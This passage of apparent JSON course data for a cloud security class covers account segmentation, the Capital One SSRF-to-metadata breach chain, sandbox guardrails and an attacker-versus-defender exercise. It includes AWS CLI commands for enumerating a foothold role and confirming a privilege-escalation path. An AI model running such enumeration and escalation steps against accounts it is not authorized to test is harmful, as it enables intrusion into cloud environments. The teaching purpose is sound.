+            "body": "The core defensive idea: put different trust levels in different isolation units so a breach of one cannot reach the others.\n\nCommon segmentation strategies:\n- Account-per-environment: separate prod, staging, and dev accounts. A compromised dev account cannot read prod data.\n- Account-per-team or per-application: blast radius is bounded to one team's scope.\n- Account-per-sensitivity: isolate the 'crown jewel' workloads (e.g. payments, PII) in their own tightly governed account.\n\nStep by step, why this works:\n1. Attacker compromises a credential or workload in account A.\n2. That credential can only call APIs within account A (unless cross-account trust was granted).\n3. Production data lives in account B, which does not trust account A.\n4. The attacker is contained — they got dev, not prod.\n\nContrast with the anti-pattern: one giant account holding everything. There, a single over-permissioned leaked key can reach every resource. Same vulnerability, catastrophic blast radius. Segmentation turns a company-ending breach into a contained incident.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Compromise",
+                  "detail": "Attacker gets a credential in dev account"
+                },
+                {
+                  "label": "Enumerate",
+                  "detail": "Can only call APIs within that account"
+                },
+                {
+                  "label": "Boundary",
+                  "detail": "Prod account does not trust dev"
+                },
+                {
+                  "label": "Contained",
+                  "detail": "Blast radius = dev only, prod safe"
+                }
+              ]
+            },
+            "check": {
+              "question": "A startup runs dev, staging, and production in ONE AWS account to 'keep it simple.' A developer's long-lived access key with broad permissions leaks on GitHub. What is the blast radius?",
+              "options": [
+                "Only the developer's personal resources",
+                "Only the dev environment, because keys are environment-scoped",
+                "Potentially every resource in the account — dev, staging, AND production",
+                "Nothing, because keys only work from the office network"
+              ],
+              "correctIndex": 2,
+              "explanation": "With everything in one account and broad permissions, a leaked key can reach all resources in that account. Separating environments into distinct accounts would have contained the breach to dev — that containment is the whole point of account segmentation."
+            }
+          },
+          {
+            "title": "Worked Example: Finding the Boundaries",
+            "body": "During recon or a review, you first establish the isolation units and the geography. These commands reveal the account you are in, the org structure (if you can see it), and which regions hold resources.\n\nThe account ID is your primary boundary marker. Listing organization accounts (if permitted) shows the segmentation strategy. Enumerating per region reminds you that a clean us-east-1 says nothing about ap-south-1 — regional services must be checked region by region.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts get-caller-identity --query Account --output text",
+                  "output": "767196576843        # which account am I in = primary boundary"
+                },
+                {
+                  "command": "aws organizations list-accounts --query 'Accounts[].[Id,Name]' --output text",
+                  "output": "767196576843  prod-payments\n912345678901  dev-sandbox   # segmentation visible"
+                },
+                {
+                  "command": "aws ec2 describe-instances --region ap-south-1 --query 'Reservations[].Instances[].InstanceId' --output text",
+                  "output": "i-0abc123  i-0def456   # regional: repeat per region!"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Landing Zones: Starting Governed, Not Retrofitting",
+            "body": "Segmentation is far easier to build in from day one than to retrofit onto a sprawling single account. A landing zone is a pre-governed, multi-account starting point: it sets up the organization, OUs, baseline SCP guardrails, centralized logging, and identity before any workloads land.\n\nAWS Control Tower is the managed service that stands up a landing zone for you. It provisions:\n- A multi-account structure (management, log-archive, audit, plus workload accounts)\n- Preventive guardrails (SCPs) and detective guardrails (config rules)\n- Centralized CloudTrail logging to a dedicated, locked-down log account\n- Single sign-on via IAM Identity Center\n\nAzure's equivalent is the Cloud Adoption Framework 'landing zone'; GCP has the Cloud Foundation / security foundations blueprint. The principle is universal: decide your isolation boundaries and guardrails up front so every new workload inherits them, rather than bolting on segmentation after an incident forces the issue."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Blast-radius thinking is structural security — it keeps working when point controls fail:\n\n- It bounds every incident. The question 'if this one credential/workload is fully compromised, what is the worst it can reach?' is answered by your account/project boundaries. Good segmentation makes that answer small.\n- It is the context for the Capital One breach (next topic) and most real cloud incidents: over-broad access inside a flat environment turned a single SSRF into mass data exfiltration.\n- Regions carry legal weight. Data residency and sovereignty (GDPR, sector rules) are enforced by region choice, not just technical controls — a compliance failure even if nothing is 'hacked.'\n- Global vs regional changes how you assess. IAM is global (one place to review); most resources are regional (enumerate every region, or attackers will hide in the one you skipped).\n\nWhen you design or review a cloud environment, blast radius is the first question: where are the bulkheads, and what does one breach actually reach?"
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-5",
+        "moduleId": "cloud-m1",
+        "number": 5,
+        "title": "Cloud Threat Landscape",
+        "type": "theory",
+        "week": 1,
+        "description": "Grounds the course in real incidents and the frameworks used to classify cloud attacks, so later modules connect to recognised TTPs rather than abstract bugs.",
+        "keyPoints": [
+          "Capital One 2019: SSRF -> instance metadata -> over-permissioned role -> S3 exfiltration",
+          "MITRE ATT&CK for Cloud (IaaS) matrix and Cloud Matrix tactics",
+          "Credential leakage (git, CI logs, public AMIs/snapshots) as the top initial access vector",
+          "Misconfiguration over exploitation: most cloud breaches are config, not CVEs",
+          "Cloud Security Alliance 'Pandemic Eleven' top threats"
+        ],
+        "slides": [
+          {
+            "title": "The Cloud Threat Landscape",
+            "body": "Before learning individual attacks, you need the shape of real cloud incidents and the frameworks used to classify them. The headline finding, backed by years of breach data: cloud attackers rarely exploit software vulnerabilities (CVEs). They exploit misconfigurations and stolen credentials.\n\nAnalogy: thieves usually do not pick high-security locks. They walk in through the door someone left unlocked, or they use a key copied from a spare left under the mat. Cloud breaches are overwhelmingly 'unlocked door' (misconfiguration) and 'key under the mat' (leaked credential) problems, not safe-cracking (zero-days).\n\nThis topic grounds the rest of the course in:\n- A landmark real incident (Capital One, 2019) that chains the core cloud attack path.\n- The frameworks (MITRE ATT&CK for Cloud, CSA top threats) that give attacks standard names.\n- The dominant initial-access vectors you will actually encounter."
+          },
+          {
+            "title": "Case Study: Capital One 2019 — The Canonical Cloud Kill Chain",
+            "body": "The Capital One breach exposed ~100 million credit applications and is the textbook example because it chains the exact primitives this course teaches. The path:\n\n1. SSRF (Server-Side Request Forgery): a misconfigured web application firewall / proxy let the attacker make the server send requests on their behalf.\n2. Instance Metadata Service (IMDS): the attacker pointed that SSRF at 169.254.169.254, the special link-local address where an EC2 instance fetches its own credentials. IMDS handed over the role's temporary credentials.\n3. Over-permissioned role: the WAF's IAM role had far broader S3 permissions than it needed.\n4. S3 exfiltration: using those stolen credentials, the attacker listed and downloaded the S3 buckets full of customer data.\n\nEvery link is a theme of this course: a classic web bug (SSRF) reaching a cloud-specific credential source (IMDS), amplified by a least-privilege failure (over-broad role), ending in a storage-access data leak. No zero-day was involved.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "SSRF",
+                  "detail": "Misconfigured WAF proxies attacker requests"
+                },
+                {
+                  "label": "IMDS",
+                  "detail": "SSRF hits 169.254.169.254, grabs role creds"
+                },
+                {
+                  "label": "Over-perm role",
+                  "detail": "Role has broad s3:* it never needed"
+                },
+                {
+                  "label": "Exfiltrate",
+                  "detail": "Stolen creds list + download S3 data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Why Misconfiguration Beats Exploitation",
+            "body": "In the cloud, the economics favor the attacker finding a misconfiguration over writing an exploit. Three structural reasons:\n\n1. The control plane is internet-facing by design. Management APIs are reachable from anywhere; a valid credential is all that is needed. There is no network to breach first.\n2. Credentials leak constantly. Access keys end up in public Git repos, CI/CD logs, container images, public AMIs and disk snapshots, and client-side JavaScript. Automated scanners sweep GitHub for keys within seconds of a push.\n3. Defaults and speed create gaps. Teams provision fast, copy over-broad example policies ('Action: *'), and leave storage or databases publicly reachable. Each is a one-line mistake with large consequences.\n\nStep by step, the common real attack is mundane:\n1. Scan public sources for a leaked credential.\n2. Run 'get-caller-identity' to see whose key it is.\n3. Enumerate what that identity can do.\n4. Use the most impactful permission (read S3, create a new admin, start instances for mining).\n\nNo CVE, no memory corruption — just an unlocked door and a found key.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Rare: CVE exploitation",
+                  "points": [
+                    "Needs a vulnerable version",
+                    "Often needs network access",
+                    "Patched over time",
+                    "Minority of cloud breaches"
+                  ]
+                },
+                {
+                  "label": "Common: config + credentials",
+                  "points": [
+                    "Leaked keys (git, CI, snapshots)",
+                    "Public buckets / open security groups",
+                    "Over-permissioned roles",
+                    "Majority of cloud breaches"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "According to years of cloud breach data, what causes the majority of cloud security incidents?",
+              "options": [
+                "Novel zero-day exploits against the hypervisor",
+                "Misconfigurations and leaked/over-permissioned credentials",
+                "Physical break-ins at data centers",
+                "Denial-of-service attacks on regions"
+              ],
+              "correctIndex": 1,
+              "explanation": "Cloud breaches are dominated by customer-side misconfiguration (public storage, open access, over-broad roles) and credential leakage — not CVE exploitation. This is why least privilege and credential hygiene are the highest-leverage defenses."
+            }
+          },
+          {
+            "title": "Top Initial-Access Vector: Leaked Credentials",
+            "body": "If misconfiguration is the theme, credential leakage is the single most common way in. Know the usual sources so you can hunt them (as an assessor) and prevent them (as a defender):\n\n- Source code: access keys hardcoded in repos, especially public GitHub/GitLab. Also in commit history even after 'removal.'\n- CI/CD logs: secrets echoed into build output in GitHub Actions, Jenkins, GitLab CI.\n- Container images: keys baked into Docker layers, retrievable with 'docker history' or by extracting layers.\n- Public disk artifacts: public AMIs and EBS/EBS snapshots that contain credentials, config files, or SSH keys.\n- Client-side exposure: API keys shipped in front-end JavaScript or mobile apps.\n- Instance metadata via SSRF: as in Capital One — not 'leaked' exactly, but stolen through a web bug.\n\nThe defender's counters preview later modules: short-lived credentials over long-lived keys, secret scanning in CI (git-secrets, truffleHog, Gitleaks), IMDSv2 to blunt SSRF-to-metadata, and detective monitoring via CloudTrail/GuardDuty."
+          },
+          {
+            "title": "Frameworks: Giving Attacks Standard Names",
+            "body": "To communicate findings and build coverage, the industry uses shared taxonomies. You will map your findings to these throughout the course:\n\n- MITRE ATT&CK for Cloud: an extension of the ATT&CK knowledge base with IaaS and SaaS matrices. It organizes real-world techniques by tactic (Initial Access, Persistence, Privilege Escalation, Credential Access, Exfiltration, etc.). Example technique: 'Unused/Unsupported Cloud Regions' for hiding activity, or 'Valid Accounts: Cloud Accounts' for credential abuse.\n- Cloud Security Alliance (CSA) 'Pandemic Eleven': the CSA's ranking of the top cloud threats — led by items like misconfiguration and inadequate change control, identity/access management weaknesses, and insecure interfaces/APIs. Note how 'misconfiguration' and 'identity' top the list, matching the breach data.\n- CIS Benchmarks: prescriptive, checkable hardening guides per provider (AWS/Azure/GCP) — the control side.\n\nWhy frameworks matter: they turn 'the chatbot did something weird' or 'this looked off' into a named technique with a shared definition, which is what makes a report credible and comparable.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "incident",
+                  "label": "Observed cloud attack",
+                  "highlighted": true
+                },
+                {
+                  "id": "attack",
+                  "label": "MITRE ATT&CK for Cloud (techniques/tactics)"
+                },
+                {
+                  "id": "csa",
+                  "label": "CSA Pandemic Eleven (threat ranking)"
+                },
+                {
+                  "id": "cis",
+                  "label": "CIS Benchmarks (hardening controls)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "incident",
+                  "to": "attack",
+                  "label": "classify technique"
+                },
+                {
+                  "from": "incident",
+                  "to": "csa",
+                  "label": "rank as threat"
+                },
+                {
+                  "from": "incident",
+                  "to": "cis",
+                  "label": "map to missing control"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to Spot It: Thinking in Attack Paths",
+            "body": "The lesson of Capital One and the breach data is that cloud attacks are chains, not single bugs. To assess or defend, trace the path from internet to data:\n\nThe recurring template:\nInternet-facing entry → compute foothold → credential theft → permission abuse → data/action.\n\nWhen reviewing an environment, walk it deliberately:\n1. Entry points: what is reachable from the internet? (Public IPs, load balancers, API Gateways, public buckets.)\n2. Foothold: if that entry is compromised, what compute or identity does it run as?\n3. Credentials: can that foothold reach IMDS, a mounted secret, or an attached role/service account?\n4. Permissions: what does that credential allow? (The least-privilege question.)\n5. Impact: what data or action does that unlock?\n\nBreaking any single link stops the chain — which is exactly why defense-in-depth works. Capital One would have been stopped by fixing the SSRF, by using IMDSv2, by scoping the role, or by segmenting the buckets. Any one link cut = no breach."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "The threat landscape sets your priorities for the entire course:\n\n- It tells you where to spend effort. Because misconfiguration and credentials dominate, the highest-value skills are IAM mastery (next module), credential hygiene, and configuration review — not exotic exploit development.\n- It gives you a real target to emulate. The Capital One chain (SSRF → IMDS → over-permissioned role → S3) is a path you will reproduce safely in labs and learn to cut at every link.\n- It connects your work to recognized TTPs. Mapping findings to MITRE ATT&CK for Cloud and CSA threats makes your reports credible to engineering and management, and lets defenders measure coverage.\n- It calibrates severity. An unauthenticated path from the internet to customer data (like Capital One) is critical; a theoretical issue needing three unlikely preconditions is not. Real-incident grounding keeps your judgment honest.\n\nCarry one sentence forward: in the cloud, the attacker is usually looking for a door you left unlocked and a key you dropped — identity and configuration are where the fight is."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-6",
+        "moduleId": "cloud-m1",
+        "number": 6,
+        "title": "Lab Environment & Cost/Safety Guardrails",
+        "type": "setup",
+        "week": 1,
+        "description": "Gets every student a safe, free-tier-first sandbox with billing alarms and a hard rule: only ever test accounts you own. Establishes the local Docker tooling used for provider-agnostic labs.",
+        "keyPoints": [
+          "Create an isolated AWS sandbox account; enable a budget + billing alarm (CloudWatch/Budgets)",
+          "Install AWS CLI v2, configure SSO/profiles, verify with 'aws sts get-caller-identity'",
+          "Local Docker for provider-free labs (LocalStack as an offline AWS emulator)",
+          "Only test resources you own; never scan another tenant — safe-harbour and legal boundaries",
+          "Tear-down discipline: tag everything, nuke sandbox resources after each lab (aws-nuke)"
+        ],
+        "slides": [
+          {
+            "title": "Lab Environment & Cost/Safety Guardrails",
+            "body": "Before any offensive or defensive practice, you need a sandbox that is safe in two senses: safe for others (you only ever touch resources you own) and safe for you (you cannot accidentally run up a huge bill). This topic stands up that sandbox.\n\nAnalogy: a shooting range. You practice with real equipment, but inside a controlled space with backstops, rules, and a safety officer. You never point downrange at people, and you never fire outside the range. Our cloud 'range' has three backstops: an isolated account, a billing alarm, and a hard scope rule.\n\nTwo complementary environments you will build:\n1. A real but isolated AWS sandbox account (free-tier first) for authentic cloud behavior.\n2. A fully offline local emulator (LocalStack in Docker) for cost-free, no-tenant practice.\n\nThe one non-negotiable rule, stated up front: only ever test accounts and resources you own or are explicitly authorized to test. Everything else in this topic enforces or supports that rule."
+          },
+          {
+            "title": "The Isolated Sandbox Account",
+            "body": "Do not practice in an account that holds anything you care about. Create a dedicated sandbox account whose only purpose is learning, so a mistake there costs nothing.\n\nWhy a separate account (not just a separate user)? Recall from the blast-radius topic: the account is AWS's hard boundary. A sandbox account cannot touch your real resources, and aggressive teardown tools can safely delete everything in it.\n\nSetup checklist:\n- Create a fresh AWS account (or a dedicated member account under an Organization).\n- Secure the root user: strong password, hardware or virtual MFA, then never use root operationally.\n- Create a least-privilege admin identity for daily work via IAM Identity Center (SSO) rather than long-lived root keys.\n- Tag everything you create with a consistent tag (e.g. project=cloudlab) so teardown can find it.\n\nThis mirrors real professional practice: pentesters and bug-bounty hunters keep strictly separate environments per engagement to avoid cross-contamination — exactly the 'one session per target' discipline used in offensive work."
+          },
+          {
+            "title": "Cost Guardrails: Avoiding Denial-of-Wallet on Yourself",
+            "body": "The cloud bills per use, so a runaway script or a left-on GPU instance can generate a frightening bill. Elasticity cuts both ways. Put hard financial backstops in place before you experiment.\n\nMechanism, layered defense:\n1. AWS Budgets: define a monthly budget (e.g. $5) with alert thresholds (50%, 80%, 100%). You get emailed before spend climbs.\n2. CloudWatch billing alarm: a classic alarm on the EstimatedCharges metric for a near-real-time trip wire.\n3. Free-tier-first habit: prefer free-tier-eligible resources (t-class micro instances, small S3 usage) and the smallest sizes that demonstrate the concept.\n4. Stop/terminate when done: idle resources still bill. A stopped EC2 instance may still incur EBS storage cost; a running one bills compute continuously.\n\nThis is the same 'denial-of-wallet' risk class (OWASP-style unbounded consumption) that attackers weaponize against targets — here you are defending against your own mistakes and any abuse of your sandbox.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Set budget",
+                  "detail": "AWS Budgets $5/mo with 50/80/100% alerts"
+                },
+                {
+                  "label": "Billing alarm",
+                  "detail": "CloudWatch alarm on EstimatedCharges"
+                },
+                {
+                  "label": "Free-tier first",
+                  "detail": "Smallest/free-eligible resources only"
+                },
+                {
+                  "label": "Tear down",
+                  "detail": "Stop/terminate idle resources after each lab"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Configure and Verify Access",
+            "body": "Install AWS CLI v2 and confirm you are talking to your sandbox — not to a production account. The identity check is the single most important habit: always confirm who and where you are before running anything.\n\nThe first command proves the CLI works and shows the account ID; cross-check that ID against your sandbox, never a real account. The budget command creates the financial backstop. Note the global `cloudlab` profile convention so you never accidentally point lab commands at the wrong credentials.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws --version",
+                  "output": "aws-cli/2.x.x Python/3.x ... (v2 confirmed)"
+                },
+                {
+                  "command": "aws sts get-caller-identity --profile cloudlab",
+                  "output": "{ \"Account\": \"912345678901\", \"Arn\": \"arn:aws:sts::912345678901:assumed-role/Sandbox/student\" }  # verify: this IS the sandbox"
+                },
+                {
+                  "command": "aws budgets create-budget --account-id 912345678901 --budget file://budget.json --profile cloudlab",
+                  "output": "(no error = $5 monthly budget + alerts created)"
+                }
+              ]
+            },
+            "check": {
+              "question": "You are about to run an enumeration script in your lab. What is the correct first command to run, and why?",
+              "options": [
+                "aws s3 rm --recursive, to clear old test data first",
+                "aws sts get-caller-identity, to confirm which account/identity you are operating as before doing anything",
+                "aws ec2 run-instances, to make sure compute is available",
+                "aws iam create-user, to get fresh credentials"
+              ],
+              "correctIndex": 1,
+              "explanation": "Always verify identity first. `aws sts get-caller-identity` confirms you are in the intended sandbox account and running as the expected identity — the safeguard against accidentally acting on the wrong (or a production) account."
+            }
+          },
+          {
+            "title": "The Offline Option: LocalStack in Docker",
+            "body": "For many labs you do not need a real cloud at all. LocalStack is a local emulator of AWS services (S3, IAM, Lambda, DynamoDB, and many more) that runs in a Docker container on your own machine. It is the safest possible sandbox: nothing leaves your laptop, nothing is billed, and no real tenant is involved.\n\nHow it works:\n- You run LocalStack as a container exposing an AWS-compatible endpoint (default http://localhost:4566).\n- You point the AWS CLI at that endpoint with --endpoint-url, using dummy credentials.\n- The CLI behaves as if talking to AWS, but all resources are emulated locally and disappear when the container stops.\n\nThis is exactly the 'provider-free' lab the course uses for enumeration drills. It is perfect for practicing recon commands, writing automation, and experimenting with misconfigurations with zero cost and zero risk. Note the recurring environment caveat on Windows: Docker Desktop with the WSL2 backend is the usual setup, and client/daemon API-version compatibility is a known friction point (addressed in the lab-setup module).",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "docker run --rm -d -p 4566:4566 localstack/localstack",
+                  "output": "a1b2c3...  (LocalStack listening on :4566)"
+                },
+                {
+                  "command": "aws --endpoint-url=http://localhost:4566 s3 mb s3://offline-test",
+                  "output": "make_bucket: offline-test   # emulated, no real AWS, no cost"
+                },
+                {
+                  "command": "aws --endpoint-url=http://localhost:4566 s3 ls",
+                  "output": "2026-11-16 12:00:00 offline-test"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Scope Discipline and Teardown",
+            "body": "Two habits turn a sandbox into genuinely safe practice:\n\n1. Scope discipline — the legal and ethical backstop. Only test resources you own or are explicitly authorized to test. Never scan, enumerate, or attack another tenant, account, or someone else's cloud resource. This mirrors professional safe-harbor rules: authorized scope only, never DoS or touch assets outside your remit. Cloud makes it easy to accidentally point a tool at the wrong account ID or a public resource you do not own — the identity-check habit and distinct profiles guard against this.\n\n2. Teardown discipline — the cost and hygiene backstop. After each lab, remove what you created:\n- Tag every resource (project=cloudlab) at creation so cleanup can find it.\n- Use targeted deletes, or a tool like aws-nuke that removes all resources in an account (safe only because it is a dedicated sandbox — never aim it at a real account).\n- Verify spend returned to baseline and no orphaned resources remain.\n\nTogether these make the sandbox reset-to-clean in one step and keep you inside legal and budget boundaries.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Safe lab discipline (do)",
+                  "points": [
+                    "Test only accounts you own",
+                    "Verify identity before acting",
+                    "Tag + budget everything",
+                    "Tear down after each lab (aws-nuke on sandbox only)"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Danger (never)",
+                  "points": [
+                    "Scan another tenant/account",
+                    "Run tools at a prod account ID",
+                    "Leave GPU/compute running",
+                    "Point aws-nuke at a real account"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "A disciplined lab is the foundation for everything offensive and defensive you will do:\n\n- It keeps you legal. The 'only test what you own' rule is not a formality — unauthorized cloud enumeration or attack is a crime. A sandbox account plus LocalStack means you always have a legal target and never need to touch someone else's tenant.\n- It keeps you solvent. Budgets, billing alarms, free-tier habits, and teardown prevent denial-of-wallet against yourself. The same consumption risk you will later study as an attack is first a danger to your own wallet.\n- It makes experiments repeatable. Tagging and one-command teardown (or an ephemeral LocalStack container) mean a broken or messy state is one reset from clean, so you can fail freely and try again.\n- It builds professional reflexes. Identity verification, scope discipline, and environment isolation are exactly the habits of real pentesters and bug-bounty hunters. Learning them here, on a safe target, means they are automatic when the stakes are real.\n\nWith the sandbox and guardrails in place, you are ready to build the fuller toolchain and start reasoning about real attack paths."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-7",
+        "moduleId": "cloud-m1",
+        "number": 7,
+        "title": "Reading Cloud Like an Attacker vs Defender",
+        "type": "exercise",
+        "week": 1,
+        "description": "A paired-perspective exercise: take one architecture diagram and enumerate it twice — once as a defender listing controls, once as an attacker listing reachable assets and trust relationships.",
+        "keyPoints": [
+          "Identify every identity (user, role, service account) and what it can assume",
+          "Identify every public-facing entry point (ALB, API Gateway, public IP, public bucket)",
+          "Trace trust edges: who can read which secret, assume which role, reach which data store",
+          "Map the attack path from internet -> compute -> credentials -> data",
+          "Translate each attacker edge into a defender control that would cut it"
+        ],
+        "slides": [
+          {
+            "title": "Reading Cloud Like an Attacker vs Defender",
+            "body": "This is a synthesis exercise: take one cloud architecture and read it twice — once as a defender cataloguing controls, once as an attacker cataloguing reachable assets and trust relationships. Seeing both views of the same diagram is the core skill of cloud security.\n\nAnalogy: a locksmith and a burglar look at the same house very differently. The locksmith sees locks, alarms, and reinforced doors (controls). The burglar sees the unlocked window, the spare key under the mat, and the ladder in the yard (reachable paths). The house is identical; the two readings are complementary — and you need both. A defender who cannot think like an attacker protects the wrong things.\n\nThe method you will practice:\n1. Enumerate every identity and what it can become.\n2. Enumerate every public entry point.\n3. Trace the trust edges that connect them to data.\n4. Map the full attack path, then convert each attacker edge into a defender control."
+          },
+          {
+            "title": "Step 1 — Enumerate Every Identity",
+            "body": "Attackers think in identities, because identity is the cloud perimeter. For the target architecture, list every principal and, crucially, what each one can assume or become:\n\n- Human users: IAM users, SSO/federated users. What roles can they assume?\n- Workload identities: roles attached to EC2/Lambda, service accounts, managed identities. What permissions do they carry?\n- Service roles: roles services use on your behalf (e.g. a CodeBuild role, a Lambda execution role).\n\nFor each, the key questions:\n- What actions does it allow? (Scoped, or wildcard '*'?)\n- What can it assume next? (Role chaining is how a small foothold becomes admin.)\n- Where do its credentials live? (IMDS, env var, mounted secret, access key.)\n\nThe attacker's prize is any identity that can assume a more powerful identity, because that is a privilege-escalation edge. The defender's job is to make sure no low-trust identity has a path to a high-trust one.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "web",
+                  "label": "Web app EC2 role (web-role)",
+                  "highlighted": true
+                },
+                {
+                  "id": "deploy",
+                  "label": "deploy-role (can update Lambda)"
+                },
+                {
+                  "id": "admin",
+                  "label": "admin-role (full access)",
+                  "highlighted": true
+                },
+                {
+                  "id": "data",
+                  "label": "S3: customer-data"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "web",
+                  "to": "deploy",
+                  "label": "can sts:AssumeRole?"
+                },
+                {
+                  "from": "deploy",
+                  "to": "admin",
+                  "label": "iam:PassRole gap?"
+                },
+                {
+                  "from": "admin",
+                  "to": "data",
+                  "label": "s3:* reads everything"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 2 — Enumerate Every Public Entry Point",
+            "body": "Next, map the external attack surface: everything reachable from the internet. These are the doors an unauthenticated attacker can knock on.\n\nTypical entry points to hunt:\n- Load balancers (ALB/NLB) and the apps behind them.\n- API Gateway endpoints and raw public API URLs.\n- Public IP addresses on EC2 instances (and the ports their security groups allow).\n- Public object storage (S3 buckets, Blob containers, GCS buckets) and static sites.\n- Managed service endpoints inadvertently left publicly accessible (databases, caches, dashboards).\n\nFor each entry point, the defender asks 'is this supposed to be public, and is it hardened?' The attacker asks 'what does hitting this get me, and what does it run as?' The dangerous ones are entry points that both are reachable AND run as, or can reach, a powerful identity — this is where Step 1 and Step 2 connect. A public web app is low risk until you notice it runs with a role that can read the customer-data bucket.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Attacker reads entry points as",
+                  "points": [
+                    "Reachable door to knock on",
+                    "What identity does it run as?",
+                    "What can that identity reach?",
+                    "Any classic bug (SSRF/IDOR) here?"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Defender reads entry points as",
+                  "points": [
+                    "Is this meant to be public?",
+                    "Is it hardened + logged?",
+                    "Least-privilege role behind it?",
+                    "WAF / auth / IMDSv2 in place?"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Tracing Trust Edges Into an Attack Path",
+            "body": "Now connect the pieces. A trust edge is any relationship where one thing can access, assume, or read another: a role that can be assumed, a secret a workload can read, a bucket an identity can list, a security group that lets one subnet reach another.\n\nTrace the path from internet to data, link by link:\n1. Entry: public web app behind an ALB (from Step 2).\n2. Foothold: the app runs on EC2 with an attached role (from Step 1).\n3. Credential access: a bug (e.g. SSRF to IMDS) or the app itself exposes that role's credentials.\n4. Trust edge: the role can sts:AssumeRole into a deploy-role, which (via an iam:PassRole gap) can reach admin-role.\n5. Impact: admin-role has s3:* and reads the customer-data bucket.\n\nThis is the Capital One pattern generalized. The attacker's map is a graph of trust edges from a reachable entry point to valuable data. Tools like the open-source Cartography, PMapper, or Cloudsplaining automate parts of this edge-tracing — but you must understand the manual logic first.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Internet",
+                  "detail": "Public ALB → web app (entry point)"
+                },
+                {
+                  "label": "Compute",
+                  "detail": "EC2 web-role (foothold identity)"
+                },
+                {
+                  "label": "Credentials",
+                  "detail": "SSRF→IMDS steals web-role creds"
+                },
+                {
+                  "label": "Escalate",
+                  "detail": "AssumeRole/PassRole chain → admin-role"
+                },
+                {
+                  "label": "Data",
+                  "detail": "admin-role s3:* reads customer-data"
+                }
+              ]
+            },
+            "check": {
+              "question": "While reading an architecture as an attacker, which finding represents the most dangerous trust edge?",
+              "options": [
+                "A private subnet with no internet gateway",
+                "A public web app whose EC2 role can assume a far more privileged role that reads the customer-data bucket",
+                "An S3 bucket encrypted with a KMS key",
+                "An IAM user with MFA enabled and read-only access"
+              ],
+              "correctIndex": 1,
+              "explanation": "An internet-reachable entry point that runs as an identity which can escalate (via AssumeRole/PassRole) to a role reaching sensitive data is the classic high-severity attack path — exactly the Capital One shape. The others are hardened or non-reachable."
+            }
+          },
+          {
+            "title": "Worked Example: Enumerating Trust From a Foothold",
+            "body": "Suppose you have landed on the web app's role (web-role). You read your own permissions and look for escalation edges. The commands below show the attacker's enumeration loop: who am I, what can I do, what can I assume next.\n\nThe policy listing reveals a dangerous combination (sts:AssumeRole plus a loose iam:PassRole). The simulate call predicts whether an action would be allowed before you attempt it — a clean, low-noise way to map reachable edges without blindly firing API calls.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "arn:aws:sts::912345678901:assumed-role/web-role/i-0abc  # who am I"
+                },
+                {
+                  "command": "aws iam list-attached-role-policies --role-name web-role",
+                  "output": "WebAppPolicy  (allows sts:AssumeRole on deploy-role, iam:PassRole *)"
+                },
+                {
+                  "command": "aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::912345678901:role/web-role --action-names sts:AssumeRole --resource-arns arn:aws:iam::912345678901:role/deploy-role",
+                  "output": "EvalDecision: allowed  # escalation edge confirmed, web-role -> deploy-role"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 4 — Turn Every Attacker Edge Into a Defender Control",
+            "body": "The payoff of the paired reading: every edge the attacker drew is a place the defender can cut the chain. Walk the path backward and assign a control to each link. Breaking any one link defeats the whole path (defense in depth).\n\nFor the example attack path:\n- Entry (public app): add a WAF, authentication, and input validation to kill the SSRF.\n- Foothold (EC2 role creds via IMDS): enforce IMDSv2 (session-oriented, blunts SSRF-to-metadata); scope the role to least privilege.\n- Escalation edge (AssumeRole → admin): remove the trust that lets web-role assume deploy-role; tighten the iam:PassRole wildcard; separate duties.\n- Data (s3:* on customer-data): scope permissions to the specific bucket and actions needed; add bucket policies, Block Public Access, and encryption; segment the bucket into its own account.\n- Detection across all links: CloudTrail logging, GuardDuty anomaly detection, and alerts on unusual AssumeRole or S3 access.\n\nThe defender does not need to win every link — just reliably cut at least one, and ideally several, so no single failure opens the whole path.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "e1",
+                  "label": "Edge: SSRF at public app",
+                  "highlighted": true
+                },
+                {
+                  "id": "c1",
+                  "label": "Control: WAF + input validation + IMDSv2"
+                },
+                {
+                  "id": "e2",
+                  "label": "Edge: web-role → admin escalation",
+                  "highlighted": true
+                },
+                {
+                  "id": "c2",
